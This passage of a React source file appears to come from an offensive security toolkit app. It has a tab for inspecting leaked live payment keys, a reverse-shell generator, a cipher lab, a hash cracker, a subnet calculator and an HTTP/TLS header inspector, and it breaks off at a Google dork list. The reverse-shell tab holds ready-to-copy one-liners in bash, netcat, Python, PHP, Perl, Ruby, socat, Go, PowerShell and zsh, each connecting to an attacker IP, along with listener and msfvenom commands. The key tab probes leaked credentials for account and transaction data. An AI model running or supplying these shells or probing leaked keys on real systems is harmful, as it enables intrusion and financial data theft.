        Leaked/discovered payment key ka <span className="text-primary">read-only impact assessment</span> — account, balance, pending funds, transactions, refunds aur chargebacks. Money-moving actions (refund/charge/payout) intentionally disabled. Authorized assessments only.
      </p>
      <form onSubmit={run} className="bg-[#121212] border border-border p-5 space-y-3">
        <div className="grid sm:grid-cols-[210px_1fr] gap-2">
          <select className={inputCls} value={provider} onChange={(e) => setProvider(e.target.value)} data-testid="paykeys-provider">
            {PAY_PROVIDERS.map((p) => <option key={p.v} value={p.v}>{p.label}</option>)}
          </select>
          <div className="relative">
            <input className={inputCls + " pr-10"} type={show ? "text" : "password"} value={key} onChange={(e) => setKey(e.target.value)} data-testid="paykeys-key" placeholder="sk_live_… / rzp_live_… / FLWSECK-… / access token" autoComplete="off" />
            <button type="button" onClick={() => setShow((v) => !v)} className="absolute right-3 top-1/2 -translate-y-1/2 text-zinc-500 hover:text-primary">{show ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}</button>
          </div>
        </div>
        {needsSecret(provider) && (
          <input className={inputCls} type={show ? "text" : "password"} value={secret} onChange={(e) => setSecret(e.target.value)} data-testid="paykeys-secret" placeholder={provider === "razorpay" ? "key_secret" : "client_secret"} autoComplete="off" />
        )}
        <button className={btnCls} disabled={busy} data-testid="paykeys-run">{busy ? <Loader2 className="w-4 h-4 animate-spin" /> : <CreditCard className="w-4 h-4" />} Inspect Key</button>
      </form>

      {res && (
        <div className="space-y-4" data-testid="paykeys-result">
          <div className="border p-4 flex items-center gap-3"
            style={{ borderColor: res.valid ? "#22C55E66" : res.valid === null ? "#F59E0B66" : "#EF444466", background: res.valid ? "#22C55E14" : res.valid === null ? "#F59E0B14" : "#EF444414" }}
            data-testid="paykeys-validity">
            {res.valid ? <ShieldCheck className="w-5 h-5 text-emerald-400" /> : res.valid === null ? <ShieldAlert className="w-5 h-5 text-severity-medium" /> : <ShieldX className="w-5 h-5 text-severity-critical" />}
            <div className="min-w-0">
              <p className="font-heading text-sm font-semibold" style={{ color: res.valid ? "#22C55E" : res.valid === null ? "#F59E0B" : "#EF4444" }}>
                {res.valid ? "KEY VALID · ACCESS CONFIRMED" : res.valid === null ? "MANUAL VERIFICATION REQUIRED" : "KEY INVALID / NO ACCESS"}
              </p>
              <p className="data-label mt-0.5">{res.provider} · {res.mode || "unknown"} mode · {res.masked_key}</p>
              {res.error && <p className="text-xs text-zinc-400 mt-1">{res.error}</p>}
            </div>
          </div>

          {(s.name || s.email || s.website || s.id || s.app_id) && (
            <div className="bg-[#121212] border border-border p-5" data-testid="paykeys-summary">
              <p className="data-label mb-2 flex items-center gap-2"><Landmark className="w-3.5 h-3.5 text-primary" /> Account Identity</p>
              <KeyRow k="Name / Business" v={s.name} />
              <KeyRow k="Email" v={s.email} />
              <KeyRow k="Phone" v={s.phone} />
              <KeyRow k="Website" v={s.website} />
              <KeyRow k="Country" v={s.country} />
              <KeyRow k="Currency" v={s.currency} />
              <KeyRow k="Type" v={s.type} />
              <KeyRow k="Account ID" v={s.id || s.app_id} />
              <KeyRow k="Scope" v={s.scope} />
            </div>
          )}

          {Object.keys(cap).length > 0 && (
            <div className="flex flex-wrap gap-2" data-testid="paykeys-caps">
              {Object.entries(cap).map(([k, v]) => (
                <span key={k} className="font-mono text-[11px] border px-2.5 py-1"
                  style={{ color: v === true ? "#22C55E" : v === false ? "#EF4444" : "#A1A1AA", borderColor: (v === true ? "#22C55E" : v === false ? "#EF4444" : "#71717A") + "55", background: (v === true ? "#22C55E" : v === false ? "#EF4444" : "#71717A") + "14" }}>
                  {k}: {String(v)}
                </span>
              ))}
            </div>
          )}

          {bal && (
            <div className="grid sm:grid-cols-2 gap-3" data-testid="paykeys-balance">
              <div className="bg-[#121212] border border-border p-4">
                <p className="data-label mb-2 flex items-center gap-2"><Wallet className="w-3.5 h-3.5 text-emerald-400" /> Available</p>
                {(bal.available || []).length ? bal.available.map((x, i) => <p key={i} className="font-mono text-lg text-white">{fmtAmt(x.amount, x.currency)}</p>) : <p className="text-zinc-600 text-sm">—</p>}
              </div>
              <div className="bg-[#121212] border border-border p-4">
                <p className="data-label mb-2 flex items-center gap-2"><Wallet className="w-3.5 h-3.5 text-severity-medium" /> Pending</p>
                {(bal.pending || []).length ? bal.pending.map((x, i) => <p key={i} className="font-mono text-lg text-white">{fmtAmt(x.amount, x.currency)}</p>) : <p className="text-zinc-600 text-sm">—</p>}
              </div>
            </div>
          )}

          <TxList title="Last Transactions" icon={Receipt} items={res.transactions} testId="paykeys-tx" />
          <TxList title="Refunds" icon={RefreshCw} items={res.refunds} testId="paykeys-refunds" />
          <TxList title="Chargebacks / Disputes" icon={ShieldX} items={res.chargebacks} testId="paykeys-chargebacks" />
          <TxList title="Payouts / Settlements" icon={Landmark} items={res.payouts} testId="paykeys-payouts" />

          {(res.notes || []).length > 0 && (
            <div className="bg-[#0a0a0a] border border-border p-4">
              <p className="data-label mb-2">Notes</p>
              {res.notes.map((n, i) => <p key={i} className="font-mono text-[11px] text-zinc-500">• {n}</p>)}
            </div>
          )}
        </div>
      )}
    </div>
  );
}


/* ==================== Reverse Shell Generator ==================== */
const RS_TEMPLATES = {
  linux: [
    ["Bash -i", "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"],
    ["Bash 196", "0<&196;exec 196<>/dev/tcp/{IP}/{PORT}; sh <&196 >&196 2>&196"],
    ["nc mkfifo", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f"],
    ["nc -e", "nc -e /bin/sh {IP} {PORT}"],
    ["Python3", "python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect((\"{IP}\",{PORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"],
    ["PHP", "php -r '$s=fsockopen(\"{IP}\",{PORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"],
    ["Perl", "perl -e 'use Socket;$i=\"{IP}\";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"],
    ["Ruby", "ruby -rsocket -e'f=TCPSocket.open(\"{IP}\",{PORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"],
    ["socat", "socat TCP:{IP}:{PORT} EXEC:/bin/bash,pty,stderr,setsid,sigint,sane"],
    ["Golang", "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{IP}:{PORT}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go"],
  ],
  windows: [
    ["PowerShell #1", "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()\""],
    ["nc.exe", "nc.exe {IP} {PORT} -e cmd.exe"],
    ["Python3 (win)", "python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{IP}',{PORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(['cmd.exe'])\""],
  ],
  mac: [
    ["Bash -i", "bash -i >& /dev/tcp/{IP}/{PORT} 0>&1"],
    ["Python3", "python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect((\"{IP}\",{PORT}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/zsh\")'"],
    ["Zsh", "zsh -c 'zmodload zsh/net/tcp && ztcp {IP} {PORT} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"],
  ],
};
function ReverseShellTab() {
  const [ip, setIp] = useState("10.10.10.10");
  const [port, setPort] = useState("4444");
  const [os, setOs] = useState("linux");
  const fill = (t) => t.replaceAll("{IP}", ip || "IP").replaceAll("{PORT}", port || "PORT");
  const listeners = [
    ["Netcat", `nc -lvnp ${port || "PORT"}`],
    ["Netcat (rlwrap)", `rlwrap nc -lvnp ${port || "PORT"}`],
    ["socat (full TTY)", `socat file:\`tty\`,raw,echo=0 TCP-L:${port || "PORT"}`],
    ["msfvenom (linux elf)", `msfvenom -p linux/x64/shell_reverse_tcp LHOST=${ip || "IP"} LPORT=${port || "PORT"} -f elf -o shell.elf`],
  ];
  return (
    <div className="space-y-4" data-testid="revshell-panel">
      <p className="text-xs text-zinc-500 font-mono">Generate reverse-shell one-liners + matching listener. For authorized engagements only — set your attacker IP/port.</p>
      <div className="bg-[#121212] border border-border p-5 grid sm:grid-cols-[1fr_140px_160px] gap-2">
        <input className={inputCls} value={ip} onChange={(e) => setIp(e.target.value)} data-testid="revshell-ip" placeholder="attacker IP" />
        <input className={inputCls} value={port} onChange={(e) => setPort(e.target.value)} data-testid="revshell-port" placeholder="port" inputMode="numeric" />
        <select className={inputCls} value={os} onChange={(e) => setOs(e.target.value)} data-testid="revshell-os">
          <option value="linux">Linux / Unix</option>
          <option value="windows">Windows</option>
          <option value="mac">macOS</option>
        </select>
      </div>
      <div className="bg-[#121212] border border-border" data-testid="revshell-listeners">
        <div className="px-5 py-3 border-b border-border flex items-center gap-2"><Terminal className="w-4 h-4 text-primary" /><h3 className="font-heading text-sm font-semibold">Listener (run first on your box)</h3></div>
        <div className="p-4 space-y-2">
          {listeners.map(([n, cmd], i) => (
            <div key={i} className="flex items-center justify-between gap-3 border border-border bg-[#0a0a0a] px-3 py-2">
              <div className="min-w-0"><p className="data-label">{n}</p><code className="font-mono text-[11px] text-emerald-400 break-all">{cmd}</code></div>
              <button onClick={() => copy(cmd)} className="text-zinc-500 hover:text-primary shrink-0"><Copy className="w-3.5 h-3.5" /></button>
            </div>
          ))}
        </div>
      </div>
      <div className="space-y-2" data-testid="revshell-payloads">
        {RS_TEMPLATES[os].map(([n, t], i) => (
          <div key={i} className="flex items-center justify-between gap-3 border border-border bg-[#0a0a0a] px-3 py-2.5" data-testid={`revshell-${i}`}>
            <div className="min-w-0"><p className="data-label mb-0.5">{n}</p><code className="font-mono text-[11px] text-zinc-300 break-all">{fill(t)}</code></div>
            <button onClick={() => copy(fill(t))} className="text-zinc-500 hover:text-primary shrink-0" data-testid={`revshell-copy-${i}`}><Copy className="w-3.5 h-3.5" /></button>
          </div>
        ))}
      </div>
    </div>
  );
}

/* ==================== Crypto / Cipher Lab ==================== */
const B32 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
const b32enc = (s) => {
  const bytes = enc.encode(s); let bits = "", out = "";
  for (const b of bytes) bits += b.toString(2).padStart(8, "0");
  for (let i = 0; i < bits.length; i += 5) { const chunk = bits.slice(i, i + 5).padEnd(5, "0"); out += B32[parseInt(chunk, 2)]; }
  while (out.length % 8) out += "=";
  return out;
};
const b32dec = (s) => {
  s = s.replace(/=+$/, "").toUpperCase().replace(/\s+/g, ""); let bits = "";
  for (const c of s) { const v = B32.indexOf(c); if (v < 0) throw new Error("bad"); bits += v.toString(2).padStart(5, "0"); }
  const bytes = []; for (let i = 0; i + 8 <= bits.length; i += 8) bytes.push(parseInt(bits.slice(i, i + 8), 2));
  return dec.decode(Uint8Array.from(bytes));
};
const B58 = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
const b58enc = (s) => {
  let bytes = [...enc.encode(s)]; let zeros = 0; while (zeros < bytes.length && bytes[zeros] === 0) zeros++;
  const digits = [0];
  for (const b of bytes) { let carry = b; for (let j = 0; j < digits.length; j++) { carry += digits[j] << 8; digits[j] = carry % 58; carry = (carry / 58) | 0; } while (carry) { digits.push(carry % 58); carry = (carry / 58) | 0; } }
  let out = "1".repeat(zeros); for (let i = digits.length - 1; i >= 0; i--) out += B58[digits[i]]; return out;
};
const b58dec = (s) => {
  s = s.trim(); let zeros = 0; while (zeros < s.length && s[zeros] === "1") zeros++;
  const bytes = [0];
  for (const c of s) { const v = B58.indexOf(c); if (v < 0) throw new Error("bad"); let carry = v; for (let j = 0; j < bytes.length; j++) { carry += bytes[j] * 58; bytes[j] = carry & 0xff; carry >>= 8; } while (carry) { bytes.push(carry & 0xff); carry >>= 8; } }
  const out = new Array(zeros).fill(0).concat(bytes.reverse()); return dec.decode(Uint8Array.from(out));
};
const xorHex = (s, key) => { const b = enc.encode(s), k = enc.encode(key || "K"); return [...b].map((c, i) => (c ^ k[i % k.length]).toString(16).padStart(2, "0")).join(""); };
const xorFromHex = (h, key) => { const k = enc.encode(key || "K"); const bytes = (h.replace(/\s+/g, "").match(/.{1,2}/g) || []).map((x, i) => parseInt(x, 16) ^ k[i % k.length]); return dec.decode(Uint8Array.from(bytes)); };
const caesar = (s, n) => s.replace(/[a-z]/gi, (c) => { const base = c <= "Z" ? 65 : 97; return String.fromCharCode((c.charCodeAt(0) - base + ((n % 26) + 26)) % 26 + base); });
const atbash = (s) => s.replace(/[a-z]/gi, (c) => { const base = c <= "Z" ? 65 : 97; return String.fromCharCode(base + 25 - (c.charCodeAt(0) - base)); });
const vigenere = (s, key, dec_) => { key = (key || "KEY").replace(/[^a-z]/gi, "") || "KEY"; let ki = 0; return s.replace(/[a-z]/gi, (c) => { const base = c <= "Z" ? 65 : 97; const k = key[ki % key.length].toLowerCase().charCodeAt(0) - 97; ki++; const shift = dec_ ? -k : k; return String.fromCharCode((c.charCodeAt(0) - base + shift + 26) % 26 + base); }); };
const MORSE = { A: ".-", B: "-...", C: "-.-.", D: "-..", E: ".", F: "..-.", G: "--.", H: "....", I: "..", J: ".---", K: "-.-", L: ".-..", M: "--", N: "-.", O: "---", P: ".--.", Q: "--.-", R: ".-.", S: "...", T: "-", U: "..-", V: "...-", W: ".--", X: "-..-", Y: "-.--", Z: "--..", 0: "-----", 1: ".----", 2: "..---", 3: "...--", 4: "....-", 5: ".....", 6: "-....", 7: "--...", 8: "---..", 9: "----.", ".": ".-.-.-", ",": "--..--", "?": "..--..", "/": "-..-.", " ": "/" };
const RMORSE = Object.fromEntries(Object.entries(MORSE).map(([k, v]) => [v, k]));
const morseEnc = (s) => [...s.toUpperCase()].map((c) => MORSE[c] ?? "").filter(Boolean).join(" ");
const morseDec = (s) => s.trim().split(/\s+/).map((t) => RMORSE[t] ?? "").join("");
const printableRatio = (s) => { if (!s) return 0; let ok = 0; for (const c of s) { const code = c.charCodeAt(0); if (code >= 32 && code < 127) ok++; } return ok / s.length; };
function CipherTab() {
  const [text, setText] = useState("");
  const [op, setOp] = useState("Base32 encode");
  const [key, setKey] = useState("");
  const [out, setOut] = useState("");
  const [magic, setMagic] = useState([]);
  const OPS2 = {
    "Base32 encode": (s) => b32enc(s), "Base32 decode": (s) => b32dec(s),
    "Base58 encode": (s) => b58enc(s), "Base58 decode": (s) => b58dec(s),
    "XOR → hex": (s) => xorHex(s, key), "XOR hex → text": (s) => xorFromHex(s, key),
    "Caesar / ROT-N": (s) => caesar(s, parseInt(key) || 13),
    "Vigenère encode": (s) => vigenere(s, key, false), "Vigenère decode": (s) => vigenere(s, key, true),
    "Atbash": (s) => atbash(s), "Morse encode": (s) => morseEnc(s), "Morse decode": (s) => morseDec(s),
  };
  const needsKey = /XOR|Caesar|Vigen/.test(op);
  const run = () => { try { setOut(OPS2[op](text)); setMagic([]); } catch { setOut("⚠ invalid input for this operation"); } };
  const runMagic = () => {
    const cands = [];
    const tryit = (name, fn) => { try { const r = fn(text); if (r && printableRatio(r) > 0.85 && /[a-z0-9 ]/i.test(r)) cands.push({ name, r }); } catch { /* skip */ } };
    tryit("Base64", b64dec); tryit("Base32", b32dec); tryit("Base58", b58dec);
    tryit("Hex", hexdec); tryit("Binary", bindec); tryit("ROT13", rot13); tryit("Atbash", atbash);
    for (let n = 1; n <= 25; n++) tryit(`Caesar ROT-${n}`, (s) => caesar(s, n));
    tryit("Morse", morseDec); tryit("URL", decodeURIComponent);
    const seen = new Set(); const uniq = cands.filter((c) => { if (seen.has(c.r)) return false; seen.add(c.r); return true; });
    setMagic(uniq.slice(0, 12)); if (!uniq.length) toast.message("No confident decode found");
  };
  return (
    <div className="grid md:grid-cols-2 gap-4" data-testid="cipher-panel">
      <div className="bg-[#121212] border border-border p-5 space-y-3">
        <label className="data-label">Input</label>
        <textarea className={areaCls} value={text} onChange={(e) => setText(e.target.value)} data-testid="cipher-input" placeholder="Paste text or ciphertext…" />
        <div className="flex gap-2">
          <select className={inputCls} value={op} onChange={(e) => setOp(e.target.value)} data-testid="cipher-op">
            {Object.keys(OPS2).map((k) => <option key={k} value={k}>{k}</option>)}
          </select>
          <button className={btnCls} onClick={run} data-testid="cipher-run"><ArrowRightLeft className="w-4 h-4" /> Run</button>
        </div>
        {needsKey && <input className={inputCls} value={key} onChange={(e) => setKey(e.target.value)} data-testid="cipher-key" placeholder={/Caesar/.test(op) ? "shift (e.g. 13)" : "key"} />}
        <button className={btnCls + " w-full bg-transparent border border-primary/40 text-primary hover:bg-primary/10"} onClick={runMagic} data-testid="cipher-magic"><Wand2 className="w-4 h-4" /> Magic auto-decode</button>
      </div>
      <div className="bg-[#121212] border border-border p-5 space-y-3">
        <div className="flex items-center justify-between"><label className="data-label">Output</label>
          <button onClick={() => copy(out)} className="text-zinc-500 hover:text-primary" data-testid="cipher-copy"><Copy className="w-3.5 h-3.5" /></button></div>
        <textarea readOnly className={areaCls + " text-primary"} value={out} data-testid="cipher-output" placeholder="Result appears here…" />
        {magic.length > 0 && (
          <div className="space-y-2" data-testid="cipher-magic-result">
            <p className="data-label">Magic candidates</p>
            {magic.map((m, i) => (
              <div key={i} className="border border-border bg-[#0a0a0a] p-2">
                <div className="flex items-center justify-between"><span className="font-mono text-[10px] text-primary">{m.name}</span>
                  <button onClick={() => copy(m.r)} className="text-zinc-500 hover:text-primary"><Copy className="w-3 h-3" /></button></div>
                <p className="font-mono text-[11px] text-zinc-300 break-all mt-1">{m.r.slice(0, 200)}</p>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}

/* ==================== Hash Identifier + Cracker ==================== */
function HashCrackTab() {
  const [hash, setHash] = useState("");
  const [wordlist, setWordlist] = useState("");
  const [busy, setBusy] = useState(false);
  const [res, setRes] = useState(null);
  const run = async (e) => {
    e.preventDefault(); if (!hash.trim()) return toast.error("Paste a hash");
    setBusy(true); setRes(null);
    try { const { data } = await api.post("/toolkit/hash-crack", { hash: hash.trim(), wordlist }); setRes(data); data.cracked ? toast.success(`Cracked: ${data.cracked}`) : toast.message("Not in wordlist"); }
    catch (err) { toast.error(formatApiError(err.response?.data?.detail) || "Failed"); }
    finally { setBusy(false); }
  };
  return (
    <div className="space-y-4" data-testid="hashcrack-panel">
      <p className="text-xs text-zinc-500 font-mono">Auto-identify a hash (MD5/SHA/NTLM/bcrypt/…) and attempt a dictionary crack against a built-in common-password list. Add your own words below (one per line). Authorized use only.</p>
      <form onSubmit={run} className="bg-[#121212] border border-border p-5 space-y-3">
        <input className={inputCls} value={hash} onChange={(e) => setHash(e.target.value)} data-testid="hashcrack-input" placeholder="e.g. 5f4dcc3b5aa765d61d8327deb882cf99" />
        <div className="flex items-center gap-3 flex-wrap">
          <label className="inline-flex items-center gap-1.5 text-[11px] font-mono uppercase tracking-wider border border-zinc-800 px-2.5 py-1.5 text-zinc-400 hover:border-primary/50 hover:text-primary transition-colors cursor-pointer" data-testid="hashcrack-file-label">
            <Upload className="w-3.5 h-3.5" /> Upload wordlist
            <input type="file" accept=".txt,.lst,.dic,text/plain" className="hidden" data-testid="hashcrack-file"
              onChange={(e) => { const f = e.target.files?.[0]; if (!f) return; const r = new FileReader(); r.onload = () => { const lines = String(r.result).split(/\r?\n/).filter(Boolean); setWordlist(lines.slice(0, 300000).join("\n")); toast.success(`Loaded ${Math.min(lines.length, 300000)} words from ${f.name}`); }; r.readAsText(f); }} />
          </label>
          {wordlist && <span className="text-[11px] font-mono text-zinc-500">{wordlist.split("\n").filter(Boolean).length} custom words loaded (checked first)</span>}
        </div>
        <textarea className={areaCls} value={wordlist} onChange={(e) => setWordlist(e.target.value)} data-testid="hashcrack-wordlist" placeholder="(optional) extra candidate passwords, one per line — or upload a wordlist above" />
        <button className={btnCls} disabled={busy} data-testid="hashcrack-run">{busy ? <Loader2 className="w-4 h-4 animate-spin" /> : <Unlock className="w-4 h-4" />} Identify &amp; Crack</button>
      </form>
      {res && (
        <div className="space-y-3" data-testid="hashcrack-result">
          <div className="bg-[#121212] border border-border p-4">
            <p className="data-label mb-2">Likely hash type</p>
            <div className="flex flex-wrap gap-2">
              {res.candidates.map((c, i) => <span key={i} className="font-mono text-[11px] border border-primary/40 bg-primary/10 text-primary px-2.5 py-1">{c}</span>)}
            </div>
          </div>
          <div className="border p-4 flex items-center gap-3" style={{ borderColor: res.cracked ? "#22C55E66" : "#71717A55", background: res.cracked ? "#22C55E14" : "#71717A14" }} data-testid="hashcrack-verdict">
            {res.cracked ? <Unlock className="w-5 h-5 text-emerald-400" /> : <Lock className="w-5 h-5 text-zinc-400" />}
            <div className="min-w-0">
              {res.cracked ? (
                <><p className="font-heading text-sm font-semibold text-emerald-400">CRACKED · {res.cracked_algo}</p><p className="font-mono text-lg text-white mt-0.5 break-all" data-testid="hashcrack-plain">{res.cracked}</p></>
              ) : (
                <p className="font-heading text-sm font-semibold text-zinc-300">{res.crackable ? "Not found in wordlist" : "Hash type not dictionary-crackable here (salted/slow)"}</p>
              )}
              <p className="data-label mt-1">tried {res.tried} of {res.wordlist_size} candidates</p>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

/* ==================== Subnet / CIDR Calculator ==================== */
const ipToInt = (ip) => ip.split(".").reduce((a, o) => (a << 8) + (parseInt(o, 10) & 255), 0) >>> 0;
const intToIp = (n) => [24, 16, 8, 0].map((s) => (n >>> s) & 255).join(".");
function SubnetTab() {
  const [cidr, setCidr] = useState("192.168.1.0/24");
  const [res, setRes] = useState(null);
  const [err, setErr] = useState("");
  const calc = () => {
    setErr(""); setRes(null);
    const m = cidr.trim().match(/^(\d{1,3}(?:\.\d{1,3}){3})\/(\d{1,2})$/);
    if (!m) return setErr("Format: 192.168.1.0/24");
    const bits = parseInt(m[2], 10);
    const octs = m[1].split(".").map(Number);
    if (bits > 32 || octs.some((o) => o > 255)) return setErr("Invalid IP or prefix");
    const ipInt = ipToInt(m[1]);
    const mask = bits === 0 ? 0 : (0xFFFFFFFF << (32 - bits)) >>> 0;
    const network = (ipInt & mask) >>> 0;
    const broadcast = (network | (~mask >>> 0)) >>> 0;
    const total = Math.pow(2, 32 - bits);
    const usable = bits >= 31 ? total : total - 2;
    setRes({
      network: intToIp(network), broadcast: intToIp(broadcast), netmask: intToIp(mask),
      wildcard: intToIp(~mask >>> 0), first: intToIp(bits >= 31 ? network : network + 1),
      last: intToIp(bits >= 31 ? broadcast : broadcast - 1), total, usable, prefix: bits,
    });
  };
  const Row = ({ k, v }) => (
    <div className="flex justify-between gap-3 border-b border-border/50 py-2 font-mono text-xs"><span className="text-zinc-500">{k}</span><span className="text-zinc-200 break-all">{v}</span></div>
  );
  return (
    <div className="space-y-4" data-testid="subnet-panel">
      <p className="text-xs text-zinc-500 font-mono">IPv4 subnet calculator — network, broadcast, mask, wildcard, host range and usable-host count from a CIDR.</p>
      <div className="bg-[#121212] border border-border p-5 flex flex-col sm:flex-row gap-2">
        <input className={inputCls} value={cidr} onChange={(e) => setCidr(e.target.value)} data-testid="subnet-input" placeholder="192.168.1.0/24" />
        <button className={btnCls} onClick={calc} data-testid="subnet-run"><Network className="w-4 h-4" /> Calculate</button>
      </div>
      {err && <p className="text-sm text-severity-high" data-testid="subnet-error">{err}</p>}
      {res && (
        <div className="bg-[#121212] border border-border p-5" data-testid="subnet-result">
          <Row k="Network address" v={`${res.network}/${res.prefix}`} />
          <Row k="Broadcast address" v={res.broadcast} />
          <Row k="Netmask" v={res.netmask} />
          <Row k="Wildcard mask" v={res.wildcard} />
          <Row k="Usable host range" v={`${res.first} — ${res.last}`} />
          <Row k="Total addresses" v={res.total.toLocaleString()} />
          <Row k="Usable hosts" v={res.usable.toLocaleString()} />
        </div>
      )}
    </div>
  );
}

/* ==================== HTTP Header & TLS Cert Inspector ==================== */
function HttpInspectTab() {
  const [url, setUrl] = useState("");
  const [busy, setBusy] = useState(false);
  const [res, setRes] = useState(null);
  const run = async (e) => {
    e.preventDefault(); if (!url.trim()) return toast.error("Enter a URL");
    setBusy(true); setRes(null);
    try { const { data } = await api.post("/toolkit/http-inspect", { url: url.trim() }); setRes(data); toast.success(`HTTP ${data.status} · grade ${data.security.grade}`); }
    catch (err) { toast.error(formatApiError(err.response?.data?.detail) || "Request failed"); }
    finally { setBusy(false); }
  };
  const gradeColor = (g) => g === "A+" || g === "A" ? "#22C55E" : g === "B" || g === "C" ? "#F59E0B" : "#EF4444";
  const t = res?.tls || {};
  return (
    <div className="space-y-4" data-testid="httpinspect-panel">
      <p className="text-xs text-zinc-500 font-mono">Fetch a URL server-side — HTTP status, response headers, a security-header grade and the TLS certificate (issuer, validity, SANs).</p>
      <form onSubmit={run} className="flex flex-col sm:flex-row gap-2">
        <input className={inputCls} value={url} onChange={(e) => setUrl(e.target.value)} data-testid="httpinspect-input" placeholder="example.com  or  https://example.com/path" />
        <button className={btnCls} disabled={busy} data-testid="httpinspect-run">{busy ? <Loader2 className="w-4 h-4 animate-spin" /> : <ServerCog className="w-4 h-4" />} Inspect</button>
      </form>
      {res && (
        <div className="space-y-4" data-testid="httpinspect-result">
          <div className="grid sm:grid-cols-[1fr_auto] gap-3">
            <div className="bg-[#121212] border border-border p-4 space-y-1.5 font-mono text-xs">
              <div className="flex justify-between border-b border-border/50 pb-1"><span className="text-zinc-500">Status</span><span className="text-white">{res.status}</span></div>
              <div className="flex justify-between border-b border-border/50 pb-1"><span className="text-zinc-500">Final URL</span><span className="text-zinc-300 text-right break-all">{res.final_url}</span></div>
              <div className="flex justify-between border-b border-border/50 pb-1"><span className="text-zinc-500">Server</span><span className="text-zinc-300 text-right">{res.server || "—"}</span></div>
              <div className="flex justify-between border-b border-border/50 pb-1"><span className="text-zinc-500">X-Powered-By</span><span className="text-zinc-300 text-right">{res.powered_by || "—"}</span></div>
              <div className="flex justify-between"><span className="text-zinc-500">Latency</span><span className="text-zinc-300">{res.elapsed_ms} ms</span></div>
            </div>
            <div className="bg-[#121212] border border-border p-4 flex flex-col items-center justify-center min-w-[130px]" data-testid="httpinspect-grade">
              <p className="data-label mb-1">Sec grade</p>
              <p className="font-heading text-4xl font-bold" style={{ color: gradeColor(res.security.grade) }}>{res.security.grade}</p>
              <p className="data-label mt-1">{res.security.score}/6 headers</p>
            </div>
          </div>

          <div className="grid sm:grid-cols-2 gap-3">
            <div className="bg-[#121212] border border-border p-4">
              <p className="data-label mb-2 flex items-center gap-2 text-emerald-400"><ShieldCheck className="w-3.5 h-3.5" /> Present</p>
              {res.security.present.length ? res.security.present.map((h, i) => <p key={i} className="font-mono text-[11px] text-zinc-300">✓ {h}</p>) : <p className="text-zinc-600 text-xs">none</p>}
            </div>
            <div className="bg-[#121212] border border-border p-4">
              <p className="data-label mb-2 flex items-center gap-2 text-severity-high"><ShieldAlert className="w-3.5 h-3.5" /> Missing</p>
              {res.security.missing.length ? res.security.missing.map((h, i) => <p key={i} className="font-mono text-[11px] text-zinc-400">✗ {h}</p>) : <p className="text-emerald-400 text-xs">all present 🎉</p>}
            </div>
          </div>

          {t && !t.error && (
            <div className="bg-[#121212] border border-border p-4 space-y-1.5 font-mono text-xs" data-testid="httpinspect-tls">
              <p className="data-label mb-2 flex items-center gap-2"><Lock className="w-3.5 h-3.5 text-primary" /> TLS Certificate
                {t.expired ? <span className="text-severity-critical">· EXPIRED</span> : <span className="text-emerald-400">· valid ({t.days_left}d left)</span>}
                {t.self_signed && <span className="text-severity-medium">· self-signed</span>}
              </p>
              <div className="flex justify-between border-b border-border/50 pb-1"><span className="text-zinc-500">Subject</span><span className="text-zinc-300 text-right break-all">{t.subject}</span></div>
              <div className="flex justify-between border-b border-border/50 pb-1"><span className="text-zinc-500">Issuer</span><span className="text-zinc-300 text-right break-all">{t.issuer}</span></div>
              <div className="flex justify-between border-b border-border/50 pb-1"><span className="text-zinc-500">Valid</span><span className="text-zinc-300">{t.valid_from} → {t.valid_to}</span></div>
              <div className="flex justify-between border-b border-border/50 pb-1"><span className="text-zinc-500">TLS</span><span className="text-zinc-300">{t.tls_version} · {t.cipher}</span></div>
              {t.sans?.length > 0 && <div className="pt-1"><span className="text-zinc-500">SANs ({t.sans.length})</span><p className="text-zinc-400 break-all mt-1">{t.sans.join(", ")}</p></div>}
            </div>
          )}
          {t.error && <p className="text-xs text-zinc-600 font-mono">TLS: {t.error}</p>}

          <details className="bg-[#121212] border border-border p-4" data-testid="httpinspect-headers">
            <summary className="data-label cursor-pointer">All response headers ({Object.keys(res.headers).length})</summary>
            <div className="mt-3 space-y-1 font-mono text-[11px]">
              {Object.entries(res.headers).map(([k, v]) => (
                <div key={k} className="flex gap-2 border-b border-border/40 pb-1"><span className="text-primary shrink-0">{k}:</span><span className="text-zinc-400 break-all">{v}</span></div>
              ))}
            </div>
          </details>
        </div>
      )}
    </div>
  );
}

/* ==================== Google Dork Generator ==================== */
const DORK_CATS = [
